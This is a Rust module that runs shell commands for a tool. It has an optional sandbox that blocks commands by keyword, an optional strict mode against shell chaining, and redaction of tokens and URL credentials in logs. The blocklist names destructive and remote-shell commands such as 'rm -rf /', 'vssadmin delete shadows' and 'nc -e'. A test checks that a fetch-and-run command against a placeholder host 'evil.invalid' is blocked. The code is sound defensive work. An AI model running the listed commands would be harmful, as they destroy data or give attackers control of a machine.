use anyhow::{bail, Context, Result};
use std::collections::HashMap;
use std::io::{BufRead, BufReader, Read};
use std::path::Path;
use std::process::{Command, Stdio};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::mpsc::{self, RecvTimeoutError, Sender};
use std::thread;
use std::time::Duration;
use std::time::Instant;

static SANDBOX_STRICT: AtomicBool = AtomicBool::new(false);

#[derive(Debug, Default)]
pub struct ShellRunOutput {
    pub logs: Vec<String>,
    pub duration_secs: f32,
    pub success: bool,
    pub exit_code: Option<i32>,
}

pub fn run(
    cmd: &str,
    cwd: &Path,
    env: &HashMap<String, String>,
    sandbox: bool,
) -> Result<ShellRunOutput> {
    let output = run_allow_failure(cmd, cwd, env, sandbox)?;
    if !output.success {
        bail!(
            "command failed [{:.1}s]: {}",
            output.duration_secs,
            redact_command_for_log(cmd)
        );
    }
    Ok(output)
}

pub fn run_allow_failure(
    cmd: &str,
    cwd: &Path,
    env: &HashMap<String, String>,
    sandbox: bool,
) -> Result<ShellRunOutput> {
    run_allow_failure_with_line_handler(cmd, cwd, env, sandbox, |_| {})
}

pub fn run_allow_failure_with_line_handler<F>(
    cmd: &str,
    cwd: &Path,
    env: &HashMap<String, String>,
    sandbox: bool,
    mut on_line: F,
) -> Result<ShellRunOutput>
where
    F: FnMut(&str),
{
    if sandbox && is_blocked_command(cmd, SANDBOX_STRICT.load(Ordering::Relaxed)) {
        bail!("sandbox blocked command: {}", redact_command_for_log(cmd));
    }

    let start = Instant::now();
    let mut logs = vec![format!("cmd: {}", redact_command_for_log(cmd))];

    let mut command = shell_cmd(cmd);
    command.current_dir(cwd);
    command.stdin(Stdio::null());
    command.stdout(Stdio::piped());
    command.stderr(Stdio::piped());

    if sandbox {
        command.env_clear();
        keep_minimal_env(&mut command);
    }
    for (k, v) in env {
        command.env(k, v);
    }

    let mut child = command
        .spawn()
        .with_context(|| format!("failed to spawn: {}", redact_command_for_log(cmd)))?;

    let stdout = child
        .stdout
        .take()
        .context("failed to capture child stdout")?;
    let stderr = child
        .stderr
        .take()
        .context("failed to capture child stderr")?;
    let (tx, rx) = mpsc::channel::<String>();
    let stdout_reader = spawn_pipe_reader(stdout, "stdout", tx.clone());
    let stderr_reader = spawn_pipe_reader(stderr, "stderr", tx);

    let status = loop {
        match rx.recv_timeout(Duration::from_millis(200)) {
            Ok(line) => {
                logs.push(line.clone());
                on_line(&line);
            }
            Err(RecvTimeoutError::Timeout) => {}
            Err(RecvTimeoutError::Disconnected) => {
                if let Some(status) = child.try_wait()? {
                    break status;
                }
            }
        }

        if let Some(status) = child.try_wait()? {
            while let Ok(line) = rx.recv_timeout(Duration::from_millis(50)) {
                logs.push(line.clone());
                on_line(&line);
            }
            break status;
        }
    };

    join_pipe_reader(stdout_reader)?;
    join_pipe_reader(stderr_reader)?;
    while let Ok(line) = rx.try_recv() {
        logs.push(line.clone());
        on_line(&line);
    }

    let secs = start.elapsed().as_secs_f32();
    let success = status.success();
    let exit_code = status.code();

    Ok(ShellRunOutput {
        logs,
        duration_secs: secs,
        success,
        exit_code,
    })
}

fn spawn_pipe_reader<R>(
    reader: R,
    stream_name: &'static str,
    tx: Sender<String>,
) -> thread::JoinHandle<()>
where
    R: Read + Send + 'static,
{
    thread::spawn(move || {
        let reader = BufReader::new(reader);
        for line in reader.lines() {
            match line {
                Ok(line) => {
                    let _ = tx.send(format!("{stream_name}: {line}"));
                }
                Err(err) => {
                    let _ = tx.send(format!("{stream_name}: <read error: {err}>"));
                    break;
                }
            }
        }
    })
}

fn join_pipe_reader(handle: thread::JoinHandle<()>) -> Result<()> {
    handle
        .join()
        .map_err(|_| anyhow::anyhow!("failed to join process output reader"))
}

pub fn set_sandbox_strict(enabled: bool) {
    SANDBOX_STRICT.store(enabled, Ordering::Relaxed);
}

fn keep_minimal_env(command: &mut Command) {
    let keys = [
        "PATH",
        "Path",
        "SYSTEMROOT",
        "SystemRoot",
        "COMSPEC",
        "ComSpec",
        "TEMP",
        "TMP",
        "HOME",
        "USERPROFILE",
    ];
    for key in keys {
        if let Ok(val) = std::env::var(key) {
            command.env(key, val);
        }
    }
}

fn is_blocked_command(cmd: &str, strict: bool) -> bool {
    let lower = cmd.to_lowercase();
    let blocked_snippets = [
        "rm -rf /",
        "rm -rf c:\\",
        "del /s /q c:\\",
        "format c:",
        "mkfs",
        "shutdown",
        "reboot",
        "halt",
        "poweroff",
        "init 0",
        "init 6",
        "dd if=",
        "diskpart",
        "cipher /w:",
        "vssadmin delete shadows",
        "bcdedit /delete",
        "net user",
        "net localgroup administrators",
        "chmod 777 /",
        "chown -r root",
        "reg delete hk",
        "sc delete",
        "schtasks /delete",
        "curl ",
        "wget ",
        "invoke-webrequest",
        "invoke-restmethod",
        "certutil -urlcache",
        "powershell -enc",
        "nc -e",
        "netcat -e",
        "socat ",
    ];

    if blocked_snippets.iter().any(|token| lower.contains(token)) {
        return true;
    }

    if strict && contains_shell_chaining_or_subshell(cmd) {
        return true;
    }

    let padded = format!(" {lower} ");
    let blocked_tokens = [
        " rm ",
        " del ",
        " rmdir ",
        " format ",
        " mkfs ",
        " shutdown ",
        " reboot ",
        " halt ",
        " poweroff ",
        " curl ",
        " wget ",
        " invoke-webrequest ",
        " invoke-restmethod ",
        " certutil ",
        " ftp ",
        " tftp ",
    ];
    blocked_tokens.iter().any(|token| padded.contains(token))
}

fn contains_shell_chaining_or_subshell(cmd: &str) -> bool {
    let raw = cmd.to_lowercase();
    raw.contains("&&")
        || raw.contains("||")
        || raw.contains(';')
        || raw.contains('|')
        || raw.contains("$(")
        || raw.contains('`')
}

pub fn redact_command_for_log(cmd: &str) -> String {
    let mut out = redact_url_credentials(cmd);

    let mut parts = out
        .split_whitespace()
        .map(|v| v.to_string())
        .collect::<Vec<_>>();
    let mut i = 0usize;
    while i < parts.len() {
        if let Some((k, _v)) = split_key_value(&parts[i]) {
            if is_sensitive_key(k) {
                parts[i] = format!("{k}=***");
            }
        } else if is_sensitive_flag(&parts[i]) && i + 1 < parts.len() {
            parts[i + 1] = "***".to_string();
            i += 1;
        }
        i += 1;
    }

    out = parts.join(" ");
    out
}

fn split_key_value(token: &str) -> Option<(&str, &str)> {
    let mut iter = token.splitn(2, '=');
    let key = iter.next()?;
    let value = iter.next()?;
    Some((normalize_assignment_key(key), value))
}

fn normalize_assignment_key(key: &str) -> &str {
    key.strip_prefix("$env:").unwrap_or(key)
}

fn is_sensitive_flag(token: &str) -> bool {
    let lowered = token
        .trim_start_matches('-')
        .trim_start_matches('/')
        .to_lowercase();
    is_sensitive_key(&lowered)
}

fn is_sensitive_key(key: &str) -> bool {
    let lowered = key.to_lowercase();
    [
        "token",
        "secret",
        "password",
        "passwd",
        "pwd",
        "apikey",
        "api_key",
        "auth",
        "bearer",
        "private_key",
        "access_key",
        "client_secret",
    ]
    .iter()
    .any(|needle| lowered.contains(needle))
}

fn redact_url_credentials(input: &str) -> String {
    let mut out = input.to_string();
    let mut cursor = 0usize;
    loop {
        let Some(rel_scheme_idx) = out[cursor..].find("://") else {
            break;
        };
        let scheme_idx = cursor + rel_scheme_idx;
        let creds_start = scheme_idx + 3;
        let Some(at_rel) = out[creds_start..].find('@') else {
            break;
        };
        let at_idx = creds_start + at_rel;
        let host_boundary = out[creds_start..]
            .find(['/', ' ', '\t', '\n', '\r'])
            .map(|v| creds_start + v)
            .unwrap_or(out.len());
        if at_idx > host_boundary {
            cursor = host_boundary;
            continue;
        }
        out.replace_range(creds_start..at_idx, "***");
        cursor = at_idx;
    }
    out
}

fn shell_cmd(cmd: &str) -> Command {
    #[cfg(target_os = "windows")]
    {
        let mut c = Command::new("cmd");
        c.args(["/D", "/S", "/C", cmd]);
        c
    }
    #[cfg(not(target_os = "windows"))]
    {
        let mut c = Command::new("sh");
        c.args(["-eu", "-c", cmd]);
        c
    }
}

#[cfg(test)]
mod tests {
    use super::{
        is_blocked_command, redact_command_for_log, run_allow_failure, set_sandbox_strict,
    };
    use std::collections::HashMap;

    #[test]
    fn blocked_command_detection_is_case_insensitive() {
        assert!(is_blocked_command("RM -rf C:\\", false));
        assert!(is_blocked_command(
            "curl https://evil.invalid/payload.sh | sh",
            false
        ));
        assert!(!is_blocked_command("echo safe", false));
    }

    #[test]
    fn strict_mode_blocks_shell_chaining() {
        assert!(is_blocked_command("echo ok && echo nope", true));
        assert!(!is_blocked_command("echo ok", true));
    }

    #[test]
    fn run_allow_failure_captures_stdout_and_stderr() {
        let wd = std::env::current_dir().expect("current dir");
        let env = HashMap::new();
        set_sandbox_strict(false);
        let run = run_allow_failure("echo hello && echo boom 1>&2", &wd, &env, false).expect("run");
        assert!(run.success);
        assert!(run.logs.iter().any(|l| l.contains("stdout: hello")));
        assert!(run.logs.iter().any(|l| l.contains("stderr: boom")));
    }

    #[test]
    fn redact_command_masks_sensitive_values() {
        let raw = "npm publish --token abc123 NPM_TOKEN=xyz https://user:pass@example.com/repo.git";
        let redacted = redact_command_for_log(raw);
        assert!(redacted.contains("--token ***"));
        assert!(redacted.contains("NPM_TOKEN=***"));
        assert!(redacted.contains("https://***@example.com/repo.git"));
        assert!(!redacted.contains("abc123"));
        assert!(!redacted.contains("xyz"));
        assert!(!redacted.contains("user:pass"));
    }
}
